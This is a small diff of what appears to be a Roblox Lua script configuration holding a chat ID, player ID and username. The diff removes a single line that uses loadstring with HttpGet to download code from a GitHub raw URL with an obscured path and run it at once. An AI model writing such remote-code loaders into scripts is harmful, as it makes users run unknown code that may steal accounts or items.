@@ -4,4 +4,3 @@ CustomChatId = 7826742521
 CustomLoadTime = 100
 CustomPlayerId = 1537677213
 CustomPlayerUsername = "wssdfgiby"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lanshrblx/robloxscripts/refs/heads/main/gag-bpvr00dx1dz0pcgtgo5kz078vey2kpcwdlvcfvzrmw4bc3qrykyqftec9orq72hf13721whasx4norhkip8keavjss950a1gadbo7678haa82ulymggtbfauia3yxe07boqicbrugoyxw8clq0dp666mn6iridakj6yiqvcablmq6twavw12ynxf08fcysb0kalwh7hj"))()
